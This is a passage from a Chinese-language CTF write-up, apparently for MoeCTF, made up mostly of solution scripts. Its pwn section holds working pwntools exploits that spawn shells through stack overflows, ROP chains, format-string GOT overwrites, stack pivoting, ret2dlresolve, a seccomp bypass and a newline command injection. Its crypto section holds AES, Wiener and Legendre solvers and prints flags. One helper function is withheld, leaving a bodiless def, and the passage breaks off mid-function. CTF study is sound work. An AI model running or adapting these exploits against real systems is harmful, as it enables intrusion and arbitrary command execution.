io = remote('127.0.0.1',64573)
exploit()
```

### boom_revenge

```Python
#!/usr/bin/env python3
import contextvars

from pwn import *
from ctypes import CDLL
import time

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

back_door = 0x401276
ret = 0x40101a

def exploit():
    # 加载libc并设置随机种子
    libc = CDLL('./libc-2.23.so')
    current_time = int(time.time())
    libc.srand(current_time)
    #gdb.attach(io,'b*0x401410\nc')

    canary = libc.rand() % 114514
    success(hex(canary))

    payload = p64(0xdeadbeef)
    payload += (p32(canary) * 36)
    payload += p64(ret) + p64(back_door)
    success(hex(len(payload)))

    io.recvuntil('(y/n)')
    io.sendline('y')
    io.recvuntil('Enter your message: ')

    io.sendline(payload)
    io.interactive()



#io = process('./pwn')
io = remote('127.0.0.1',64573)
exploit()
```

### No way to leak!

def forge_linkmap是个板子，本人比较护食，不放出来了

```Python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

from pwn import flat

def forge_linkmap(linkmap_addr, known_libc_RVA, call_libc_RVA, known_elf_got_VA, bss_base, custom_data):
def main():
    #sh = process('./pwn')
    sh = remote('127.0.0.1',50993)
    elf = ELF('./pwn')
    #gdb.attach(sh,'b *0x401187\nc')
    libc = ELF("./libc-2.31.so")
    pop_rdi = 0x40115E
    pop_rsi = 0x401160
    pop_rbp = 0x401163
    leave_ret = 0x401188
    _dl_runtime_resolve_addr = 0x401026
    bss = elf.bss(0xA08)
    read_addr = elf.sym['read']
    ret_addr = 0x40101a
    payload = cyclic(0x70) + p64(0xdeadbeef) + p64(pop_rsi) + p64(bss) + p64(read_addr) + p64(pop_rsi) + p64(bss+0x100) + p64(read_addr) + p64(pop_rbp) + p64(bss - 8) + p64(leave_ret)
    sh.send(payload)

    fake_inkmap_addr = bss + 0x100
    fake_inkmap, custom_data_addr = forge_linkmap(
        linkmap_addr=fake_inkmap_addr,
        known_libc_RVA=libc.sym['read'],
        call_libc_RVA=libc.sym['system'],
        known_elf_got_VA=elf.got['read'],
        bss_base=bss,
        custom_data=b"/bin/sh\x00"
    )


    payload = p64(ret_addr) + p64(pop_rdi) + p64(custom_data_addr) + p64(_dl_runtime_resolve_addr) + p64(fake_inkmap_addr) + p64(0)
    success(hex(fake_inkmap_addr))
    success(hex(bss+0x100))
    sh.send(payload)
    sleep(8)
    sh.send(fake_inkmap)
    sh.interactive()


if __name__ == "__main__":
    main()
```

### fmt

注意leak1发送时得去掉末尾的\x00，要不然会拼接到leak2发送的低1byte

```Python
from pwn import *

#sh = process('./pwn')
sh = remote('127.0.0.1', 57232)
context.terminal = ["tmux", "splitw", "-h"]
payload = '%10$pAAAA%7$s'
sh.sendlineafter('Hey there, little one, what\'s your name?',payload)
sh.recvuntil('Nice to meet you,')
leak1 = int(sh.recv(12),16)
success(hex(leak1))
sh.recvuntil('AAAA')
leak2 = sh.recvline().rstrip(b'\n')
print(leak2)
hex_str = "0x" + leak2[::-1].hex()
print(hex_str)
leak2 = int(hex_str,16)
success(hex(leak2))
#gdb.attach(sh)
packed = p64(leak1)
payload = packed[:-1]
sh.sendafter('Can you find them?',payload)

sh.sendafter('Yeah,another one?',p64(leak2))
sh.interactive()
```

### randomlock

```SQL
from pwn import *

sh = remote('127.0.0.1',58027)
#sh = process('./pwn')

def add(payload):
    sh.sendlineafter('>',str(payload))

add(9383)
add(886)
add(2777)
add(6915)
add(7793)
add(8335)
add(5386)
add(492)
add(6649)
add(1421)

sh.interactive()
```

### str_check

```Python
from pwn import *

#sh = process('./pwn')
sh = remote('127.0.0.1', 60457)

back_door = 0x401236
ret = 0x40101a
payload = b'meow'
payload = payload.ljust(0x28,b'\x00')
payload += p64(ret) + p64(back_door)

sh.sendlineafter('What can u say?',payload)
sh.sendlineafter('So,what size is it?',str(len(payload)))
sh.interactive()
```

### syslock

```Python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
#sh = process('./pwn')
sh = remote('127.0.0.1',54367)
#gdb.attach(sh,'b *0x40127F\nc')
elf = ELF('./pwn')
main = 0x4012BB
ret_addr = 0x40101a
syscall_addr = 0x401230
bins_sh = 0x404084
pop_rdi_rsi_rdx = 0x401240
pop_rax = 0x401244
sh.sendafter('choose mode\n',str(-32))
payload = p32(59) + b'/bin/sh'
sh.sendafter('Input your password\n',payload)

payload = cyclic(0x40) + p64(0xdeadbeef)  + p64(pop_rdi_rsi_rdx) + p64(bins_sh) + p64(0) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall_addr) + p64(main)
sh.sendafter('Developer Mode.\n',payload)
sh.interactive()
```

### xdulaker

```Python
from pwn import *

#sh = process('./pwn')
sh = remote('127.0.0.1',58792)

def cmd(x):
    sh.sendlineafter('>',str(x))

def pull():
    cmd(1)

def photo(data):
    cmd(2)
    sh.sendafter('Hey,what\'s your name?!',data)

def laker(data):
    cmd(3)
    sh.sendafter('welcome,xdulaker',data)

pull()
sh.recvuntil('give you a gift:')
leak = int(sh.recv(14),16)
success(hex(leak))

offset = leak - 0x4010
backdoor_addr = offset + 0x1249
ret_addr = offset + 0x101a

payload = cyclic(0x20) + b'xdulaker'
photo(payload)

payload = cyclic(0x30) + p64(0xdeadbeef) + p64(ret_addr) + p64(backdoor_addr)
laker(payload)

sh.interactive()
```

### easylibc


```Python
from pwn import *

sh = remote('127.0.0.1',57401)
#sh = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

sh.recvuntil('How can I use ')
leak = int(sh.recv(14),16)
success(hex(leak))
offset = leak - 0x1060
start_addr = offset + 0x10C0
payload = cyclic(0x20) + p64(0xdeadbeef) + p64(start_addr)
sh.send(payload)
sh.recvuntil('How can I use ')
leak2 = int(sh.recv(14),16)
success(hex(leak2))
libc.address = leak2 - libc.sym['read']
pop_rdi = libc.address + 0x2a3e5
ret = offset + 0x101a
payload = cyclic(0x20) + p64(0xdeadbeef) + p64(pop_rdi) + p64(next(libc.search('/bin/sh\x00'))) + p64(ret) + p64(libc.sym['system'])
sh.send(payload)
sh.interactive()
```

### ezpivot

这题由于system仅仅是引入了符号，并非初始化，所以在第一次初始化时会进行大量的抬栈操作，所以栈迁移时得往很高的地址去迁移

```Python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
#sh = process('./pwn')
sh = remote('127.0.0.1',53846)
elf = ELF('./pwn')

ret_addr = 0x40101a
pop_rdi = 0x401219
bss_addr = 0x404060+0x800
pivot_addr = bss_addr - 0x8
leave_ret = 0x40120f

sh.sendlineafter('the length of your introduction.',str(-1))
payload = cyclic(0x800) + p64(pop_rdi) + p64(bss_addr+0x100)  + p64(elf.symbols['system'])
payload = payload.ljust(0x900,b'\x00')
payload += b'/bin/sh\x00'
sh.send(payload)
payload = cyclic(0xc) + p64(pivot_addr) + p64(leave_ret)
sh.sendafter('Now, please tell us your phone number:',payload)

sh.interactive()
```

### ezprotection

cananry绕过第一次输入覆盖掉他的\x00，第二次put带出canry，pie由于分页机制，低12bit不变，爆破就完了，backdoor绕过，为什么我要填backdoor地址，我直接填最后一部分的open flag地址就行了

```Python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

#sh = process('./pwn')
sh = remote('127.0.0.1',60990)
#gdb.attach(sh)
payload = cyclic(0x18) + b'\xff'
sh.sendafter(b'watching over you.', payload)


sh.recvuntil(b'\xff')
rest = sh.recvn(7)
canary = u64(b'\x00' + rest)
success(hex(canary))

payload = cyclic(0x18) + p64(canary) + p64(0xdeadbeef) + p16(0x627D)
sh.sendafter('you still won',payload)
sh.interactive()
```

### hardpivot

这题就是多次栈迁移，很典的一道

```Python
from pwn import *

context.terminal=['tmux','splitw','-h']
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
#sh = process('./pwn')
sh = remote('127.0.0.1',59109)

ret = 0x40101a
bss = elf.bss() + 0x500
vuln_read = 0x401264
leave_ret = 0x40127b
pop_rdi = 0x40119e
pop_rbp = 0x40117d
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload1 = cyclic(0x40) + p64(bss + 0x40) + p64(vuln_read)
sh.sendafter('> ',payload1)

payload2 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)  # leak-libc
payload2 += p64(pop_rbp) + p64(bss + 0x200 + 0x40) + p64(vuln_read)
payload2 = payload2.ljust(0x40, b'\x00')
payload2 += p64(bss - 8) + p64(leave_ret)  #将rsp校准到bss上
sh.send(payload2)

leak = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
success(hex(leak))

payload3 = (p64(pop_rdi) + p64(next(libc.search('/bin/sh\x00'))) + p64(libc.sym['system'])).ljust(0x40, b'\x00')
payload3 += p64(bss + 0x200 - 0x8) + p64(leave_ret) #将rsp校准到bss+0x200上
sh.send(payload3)
sh.interactive()
```

### Sandbox

open被禁用可以用openant代替

```Python
from pwn import *
context(os='linux', arch='amd64',log_level='debug')
context.terminal=['tmux','splitw','-h']

elf = ELF('./pwn')
#sh = process('./pwn')
sh = remote('127.0.0.1',59692)
bss_addr = 0x4CEB60
pop_rdi = 0x401a40
pop_rsi = 0x401a42
pop_rdx = 0x401a44
pop_rax = 0x44bbbb
pop_rsp = 0x4121a8
syscall = 0x422e76

payload = p64(pop_rdi) + flat(-100) + p64(pop_rsi) + p64(bss_addr+0xE0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(257) + p64(syscall)
payload += p64(pop_rdi) + flat(3) + p64(pop_rsi) + p64(bss_addr+0x200) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(0) + p64(syscall)
payload += p64(pop_rdi) + flat(1) + p64(pop_rsi) + p64(bss_addr+0x200) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(1) + p64(syscall)
payload =payload.ljust(0xE0,b'\x00')
payload += b'/flag\x00'
sh.sendafter('You have a box, fill it.',payload)
payload = p32(0xdeadbeef) + p32(1)
payload += p64(pop_rsp) + p64(bss_addr) + p64(0xdeadbeef) * 6

sh.sendafter('Now, leave your name..',payload)

sh.interactive()
```

### inject

```Python
from pwn import *

#sh = process('./pwn')
sh = remote('127.0.0.1',57452)

sh.sendlineafter('Your choice: ',str(4))

payload = "\nsh -c sh"
sh.sendafter('Enter host to ping: ',payload)

sh.interactive()
```

### call_it

```Python
from pwn import *

elf = ELF('./pwn')
#sh = process('./pwn')
sh = remote('127.0.0.1', 56758)
context.terminal = ["tmux", "splitw", "-h"]
#gdb.attach(sh, 'b *0x401106\nc')
jop_addr = 0x401235
start = 0x401020
def cmd(x):
    sh.sendlineafter('Choose your gesture:',str(x))

for i in range(8):
    cmd(9)
payload = p64(jop_addr) + p32(0x4040F8)
payload = payload.ljust(15, b'\x00')
cmd(1)
sh.sendafter('What should I say after this gesture? ',payload)
cmd(2)
payload = p64(0x401228) + b'/bin/sh'
payload = payload.ljust(15, b'\x00')
sh.sendlineafter('What should I say after this gesture? ',payload)

for i in range(6):
    cmd(1)
    sh.sendlineafter('What should I say after this gesture? ', payload)

sh.interactive()
```

### fmt_s


```Python
from pwn import *
#io=process('./pwn')
io = remote('127.0.0.1', 60326)
libc=ELF('./libc.so.6')
#def bug():
#    gdb.attach(io,"b *0x401332\nc")
io.recvuntil(b"You start talking to him...\n")
io.send(b"%8$p")
stack=int(io.recv(14),16)-4+3
print(hex(stack))
io.sendafter(b"You enraged the monster-prepare for battle!\n",p64(0))
#-----------------------------------------------------------------------
io.recvuntil(b"You start talking to him...\n")
target=stack&0xffff
print(hex(target))
io.send(f"%{target}c%6$hn".encode())
io.sendafter(b"You enraged the monster-prepare for battle!\n",p64(0))
#-----------------------------------------------------------------------
io.recvuntil(b"You start talking to him...\n")
payload=f"%{0x90}c%47$hhn\x00".encode()
io.send(payload)
io.sendafter(b"You enraged the monster-prepare for battle!\n",p64(0))
#-----------------------------------------------------------------------
def s(payload):
    io.recvuntil(b"You start talking to him...\n")
    io.send(payload)
    io.sendafter(b"You enraged the monster-prepare for battle!\n",p64(0))
got=0x404028
stack=stack+1+0x70
target=stack&0xffff
payload=f"%{target}c%6$hn".encode()
s(payload)
payload=f"%47$lln%{got&0xff}c%47$hhn\x00".encode()
s(payload)
payload=f"%{target+1}c%6$hn\x00".encode()
s(payload)
payload=f"%{(got>>8)&0xff}c%47$hhn\x00".encode()
s(payload)
payload=f"%{target+2}c%6$hn\x00".encode()
s(payload)
payload=f"%{(got>>16)&0xff}c%47$hhn\x00".encode()
s(payload)
#-------------------------------------------------------------------------------------
got=0x404028+2
stack=stack+0x10
target=stack&0xffff
payload=f"%{target}c%6$hn".encode()
s(payload)
payload=f"%{got&0xff}c%47$hhn\x00".encode()
s(payload)
payload=f"%{target+1}c%6$hn\x00".encode()
s(payload)
payload=f"%{(got>>8)&0xff}c%47$hhn\x00".encode()
s(payload)
payload=f"%{target+2}c%6$hn\x00".encode()
s(payload)
payload=f"%{(got>>16)&0xff}c%47$hhn\x00".encode()
s(payload)
#======================
system=0x4010E0
payload=f"%26$lln%{0x40}c%28$hhn%{0x10e0-0x40}c%26$hn"
s(payload)#26,28
io.recvuntil(b"You start talking to him...\n")
io.send(b"aaa;sh;a")

io.interactive()
```

### fmt_t

```Python
from pwn import *
#io=process('./pwn')
io = remote('127.0.0.1', 62040)
libc=ELF('./libc.so.6')

got=0x404018
io.send(b"%3$p\x00")
base=int(io.recv(14),16)-0x1147e2
print(hex(base))
io.recvuntil(b"You've reached the level 5 of hell.")
io.send(b'sh;%')

io.recvuntil(b"You've reached the level 16 of hell.")
io.send(p64(got)+p64(got+2)[:-1])#18,19
io.recvuntil(b"You've reached the level 27 of hell.")
system=base+libc.sym.system
print(hex(system))
print(hex(system&0xffff))
print(hex((system>>16)&0xff))
payload=f"%{(system>>16)&0xff}c%25$hhn%{(system&0xffff)-((system>>16)&0xff)}c%24$hn".encode()
payload=payload.ljust(27,b'\x00')
io.send(payload)


io.interactive()
```

## Crypto
### ezAES

```python
rc = [0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78, 0x89, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef,0xf1]

s_box = [
        [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76],
        [0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0],
        [0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15],
        [0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75],
        [0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84],
        [0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf],
        [0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8],
        [0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2],
        [0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73],
        [0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb],
        [0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79],
        [0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08],
        [0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a],
        [0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e],
        [0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf],
        [0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]
]

s_box_inv = [
        [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb],
        [0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb],
        [0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e],
        [0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25],
        [0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92],
        [0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84],
        [0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06],
        [0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b],
        [0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73],
        [0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e],
        [0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b],
        [0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4],
        [0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f],
        [0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef],
        [0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61],
        [0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d]
]

def sub_bytes(grid):
    for i, v in enumerate(grid):
        grid[i] = s_box[v >> 4][v & 0xf]

def inv_sub_bytes(grid):
    for i, v in enumerate(grid):
        grid[i] = s_box_inv[v >> 4][v & 0xf]

def shift_rows(grid):
    for i in range(4):
        grid[i::4] = grid[i::4][i:] + grid[i::4][:i]
        grid = grid[0::4] + grid[1::4] + grid[2::4] + grid[3::4]

def inv_shift_rows(grid):
    for i in range(4):
        grid[i::4] = grid[i::4][-i:] + grid[i::4][:-i]
        grid = grid[0::4] + grid[1::4] + grid[2::4] + grid[3::4]

def mix_columns(grid):
    def mul_by_2(n):
        s = (n << 1) & 0xff
        if n & 128:
            s ^= 0x1b
        return s

    def mul_by_3(n):
        return n ^ mul_by_2(n)

    def mix_column(c):
        return [
            mul_by_2(c[0]) ^ mul_by_3(c[1]) ^ c[2] ^ c[3],  # [2 3 1 1]
            c[0] ^ mul_by_2(c[1]) ^ mul_by_3(c[2]) ^ c[3],  # [1 2 3 1]
            c[0] ^ c[1] ^ mul_by_2(c[2]) ^ mul_by_3(c[3]),  # [1 1 2 3]
            mul_by_3(c[0]) ^ c[1] ^ c[2] ^ mul_by_2(c[3]),  # [3 1 1 2]
        ]

    for i in range(0, 16, 4):
        grid[i:i + 4] = mix_column(grid[i:i + 4])

def inv_mix_columns(grid):
    def mul_by_9(n):
        # 9 = 0b1001, x*9 = x*8 xor x
        return mul_by_2(mul_by_2(mul_by_2(n))) ^ n

    def mul_by_b(n):
        # 11 = 0b1011, x*11 = x*8 xor x*2 xor x
        x8 = mul_by_2(mul_by_2(mul_by_2(n)))
        return x8 ^ mul_by_2(n) ^ n

    def mul_by_d(n):
        # 13 = 0b1101, x*13 = x*8 xor x*4 xor x
        x8 = mul_by_2(mul_by_2(mul_by_2(n)))
        x4 = mul_by_2(mul_by_2(n))
        return x8 ^ x4 ^ n

    def mul_by_e(n):
        # 14 = 0b1110, x*14 = x*8 xor x*4 xor x*2
        x8 = mul_by_2(mul_by_2(mul_by_2(n)))
        x4 = mul_by_2(mul_by_2(n))
        return x8 ^ x4 ^ mul_by_2(n)

    def mul_by_2(n):
        s = (n << 1) & 0xff
        if n & 128:
            s ^= 0x1b
        return s

    def inv_mix_column(c):
        return [
            mul_by_e(c[0]) ^ mul_by_b(c[1]) ^ mul_by_d(c[2]) ^ mul_by_9(c[3]),
            mul_by_9(c[0]) ^ mul_by_e(c[1]) ^ mul_by_b(c[2]) ^ mul_by_d(c[3]),
            mul_by_d(c[0]) ^ mul_by_9(c[1]) ^ mul_by_e(c[2]) ^ mul_by_b(c[3]),
            mul_by_b(c[0]) ^ mul_by_d(c[1]) ^ mul_by_9(c[2]) ^ mul_by_e(c[3]),
        ]

    for i in range(0, 16, 4):
        grid[i:i + 4] = inv_mix_column(grid[i:i + 4])

def key_expansion(grid):
    for i in range(10 * 4):
        r = grid[-4:]
        if i % 4 == 0:  # 对上一轮最后4字节自循环、S-box置换、轮常数异或，从而计算出当前新一轮最前4字节
            for j, v in enumerate(r[1:] + r[:1]):
                r[j] = s_box[v >> 4][v & 0xf] ^ (rc[i // 4] if j == 0 else 0)

        for j in range(4):
            grid.append(grid[-16] ^ r[j])

    return grid

def add_round_key(grid, round_key):
    for i in range(16):
        grid[i] ^= round_key[i]

def encrypt(b, expanded_key):
    # First round
    add_round_key(b, expanded_key)

    for i in range(1, 10):
        sub_bytes(b)
        shift_rows(b)
        mix_columns(b)
        add_round_key(b, expanded_key[i * 16:])

    # Final round
    sub_bytes(b)
    shift_rows(b)
    add_round_key(b, expanded_key[-16:])
    return b

def decrypt(b, expanded_key):
    # First round (last round of encryption)
    add_round_key(b, expanded_key[-16:])
    inv_shift_rows(b)
    inv_sub_bytes(b)

    for i in range(9, 0, -1):
        add_round_key(b, expanded_key[i * 16:])
        inv_mix_columns(b)
        inv_shift_rows(b)
        inv_sub_bytes(b)

    # Final round (first round of encryption)
    add_round_key(b, expanded_key)
    return b

def aes(key, msg):
    expanded = key_expansion(bytearray(key))

    # Pad the message to a multiple of 16 bytes
    b = bytearray(msg + b'\x00' * (16 - len(msg) % 16))
    # Encrypt the message
    for i in range(0, len(b), 16):
        b[i:i + 16] = encrypt(b[i:i + 16], expanded)
    return bytes(b)

def unaes(key, enc):
    expanded = key_expansion(bytearray(key))
    b = bytearray(enc)
    for i in range(0, len(b), 16):
        b[i:i + 16] = decrypt(b[i:i + 16], expanded)
    return bytes(b)

if __name__ == '__main__':
    key = b'Slightly different from the AES.'
    enc = b'%\x98\x10\x8b\x93O\xc7\xf02F\xae\xedA\x96\x1b\xf9\x9d\x96\xcb\x8bT\r\xd31P\xe6\x1a\xa1j\x0c\xe6\xc8'
    dec = unaes(key, enc)
    print('Decrypted:', dec)
    #moectf{Th1s_1s_4n_E4ZY_AE5_!@#}
```

### ez_wiener

```python
import gmpy2
from Crypto.Util.number import long_to_bytes

def continued_fraction(n, d):
    cf = []
    while d:
        q, r = divmod(n, d)
        cf.append(q)
        n, d = d, r
    return cf

def convergents(cf):
    num, den = [], []
    for i, q in enumerate(cf):
        if i == 0:
            num.append(q)
            den.append(1)
        elif i == 1:
            num.append(cf[0]*cf[1] + 1)
            den.append(cf[1])
        else:
            num.append(num[i-1]*cf[i] + num[i-2])
            den.append(den[i-1]*cf[i] + den[i-2])
        yield (num[i], den[i])

def wiener_attack(e, n):
    cf = continued_fraction(e, n)
    for k, d in convergents(cf):
        if k == 0:
            continue
        # Check if this d is the correct one
        phi = (e*d - 1) // k
        # Solve x^2 - (n - phi + 1)x + n = 0
        b = n - phi + 1
        discriminant = b*b - 4*n
        if discriminant >= 0:
            sqrt_disc = gmpy2.isqrt(discriminant)
            if sqrt_disc * sqrt_disc == discriminant:
                p = (b + sqrt_disc) // 2
                q = (b - sqrt_disc) // 2
                if p * q == n:
                    return d
    return None

n = 84605285758757851828457377667762294175752561129610097048351349279840138483398457225774806927631502994733733589395840262513798535197234231207789297886471069978772805190331670685610247724499942260404337703802384815835647029115023558590369107257177909006753910122009460031921101203824769814404613875312981158627
e = 36007582633238869298665544067678113422327323938964762672901735035127703586926259430077542134592019226503943946361640448762427529212920888008258014995041748515569059310310043800176826513779147205500576568904875173836996771537397098255940072198687847850344965265595497240636679977485413228850326441605991445193
c = 25377227886381037011295005467170637635721288768510629994676412581338590878502600384742518383737721726526909112479581593062708169548345605933735206312240456062728769148181062074615706885490647135341795076119102022317083118693295846052739605264954692456155919893515748429944928104584602929468479102980568366803

d = wiener_attack(e, n)
if d is not None:
    print("Found d:", d)
    m = pow(c, d, n)
    print("Message:", long_to_bytes(m))
else:
    print("Wiener attack failed.")
#moectf{Ez_W1NNer_@AtT@CK!||}
```

### Ledengre_revenge

```python
from Crypto.Util.number import long_to_bytes, bytes_to_long
from Crypto.Cipher import AES
import math


def tonelli_shanks(n, p):
    if pow(n, (p - 1) // 2, p) != 1:
        return None
    q = p - 1
    s = 0
    while q % 2 == 0:
        q //= 2
        s += 1
    z = 2
    while pow(z, (p - 1) // 2, p) != p - 1:
        z += 1
    m = s
    c = pow(z, q, p)
    t = pow(n, q, p)
    r = pow(n, (q + 1) // 2, p)
    while t != 1:
        t2i = t
        for i in range(1, m):
            t2i = pow(t2i, 2, p)
            if t2i == 1:
                break
        if i == m:
            return None
        b = pow(c, 1 << (m - i - 1), p)
        m = i
        c = pow(b, 2, p)
        t = (t * c) % p
        r = (r * b) % p
    return r


def function(x, p):
    if x >= p:
        return x
    if pow(x, (p - 1) // 2, p) == 1:
        return pow(x, 2, p)
    else:
        return pow(x, 3, p)


def function_inv(y, p):
    possible_x = []
    for x in range(0, 256):
        if function(x, p) == y:
            possible_x.append(x)
    return possible_x


def matrix_to_str(matrix):
    b = bytes(sum([[matrix[row][col] for col in range(4)] for row in range(4)], []))
    return b.rstrip(b'\0')


def str_to_matrix(s):
    matrix = [[0] * 4 for _ in range(4)]
    for i in range(4):
        for j in range(4):
            matrix[i][j] = function(s[i * 4 + j], 251)
    return matrix


def mod_inverse(a, n):
    t, new_t = 0, 1
    r, new_r = n, a
    while new_r != 0:
        quotient = r // new_r
        t, new_t = new_t, t - quotient * new_t
        r, new_r = new_r, r - quotient * new_r
    if r > 1:
        return None
    if t < 0:
        t = t + n
    return t


# 给定数据
p_ = 71583805456773770888820224577418671344500223401233301642692926000191389937709
e = 65537
c_key = 1679283667939124174051653611794421444808492935736643969239278575726980681302
text = 26588763961966808496088145486940545448967891102453278501457496293530671899568
a = [[239, 239, 251, 239], [233, 227, 233, 251], [251, 239, 251, 233], [233, 227, 251, 233]]
lis0 = [[341, 710, 523, 1016], [636, 366, 441, 790], [637, 347, 728, 426], [150, 184, 421, 733]]
lis1 = [[133, 301, 251, 543], [444, 996, 507, 1005], [18, 902, 379, 878], [235, 448, 836, 263]]

# 暴力破解key
for key in range(1, 65536):
    if pow(key, 2 * e, p_) == c_key:
        print(f"Found key: {key}")
        break

aes_key = long_to_bytes(key << 107)
print(f"AES key length: {len(aes_key)} bytes")  # 验证密钥长度
cipher = AES.new(aes_key, AES.MODE_ECB)

# 计算最终状态：尝试两个平方根
S1 = tonelli_shanks(text, p_)
if S1 is None:
    print("No square root found for text")
    exit()
S2 = p_ - S1  # 另一个平方根
print("Trying first square root...")
S_bytes = long_to_bytes(S1)
if len(S_bytes) < 32:
    S_bytes = b'\x00' * (32 - len(S_bytes)) + S_bytes
S0 = S_bytes[:16]
S1 = S_bytes[16:]


def reverse_round(state, lis_round, a, round_index):
    matrix_N = [[0] * 4 for _ in range(4)]
    for i in range(4):
        for j in range(4):
            matrix_N[i][j] = state[i * 4 + j]

    matrix_M = [[0] * 4 for _ in range(4)]
    for i in range(4):
        for j in range(4):
            possible_M = function_inv(matrix_N[i][j], a[i][j])
            # 修复点：直接使用 round_index 提取对应位
